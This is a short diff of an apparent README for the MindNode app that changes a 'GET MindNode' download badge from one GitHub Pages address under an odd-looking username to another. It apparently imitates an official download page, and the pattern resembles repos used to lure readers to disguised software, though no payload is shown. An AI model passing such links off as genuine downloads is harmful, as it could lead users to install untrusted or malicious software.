@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://bobwilson.ie/wp-content/uploads/2022/06/MindNode-logo1.png)
 
-[![GET MindNode](https://img.shields.io/badge/GET%20%E2%80%94%20MindNode-0078D6?style=for-the-badge&logoColor=white)](https://jaxtonhodgerlok.github.io/.github/mindnode)
+[![GET MindNode](https://img.shields.io/badge/GET%20%E2%80%94%20MindNode-0078D6?style=for-the-badge&logoColor=white)](https://mustafaandrewsdasd.github.io/.github/mindnode)
 
 ---
 
